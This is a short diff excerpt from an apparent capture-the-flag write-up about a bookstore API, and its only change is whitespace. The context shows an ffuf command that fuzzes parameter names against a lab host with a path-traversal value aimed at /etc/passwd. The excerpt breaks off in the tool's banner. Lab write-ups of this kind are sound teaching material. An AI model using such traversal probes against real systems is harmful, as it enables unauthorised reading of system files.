@@ -178,7 +178,7 @@ I interacted with the API, and it returned some book data as expected. To exploi
 This was interesting, so I tried several payloads but again was unsuccessful. Since the API documentation showed multiple parameters, I thought the `id` might be useless, so I enumerated to find other valid parameters:
 ```bash
 kali@kali:~/ctf/bookstore$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://10.10.122.52:5000/api/v1/resources/books?FUZZ=../../../../../../../etc/passwd'  
-
+ 
           /'___\  /'___\           /'___\       
         /\ \__/ /\ \__/  __  __  /\ \__/       
         \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
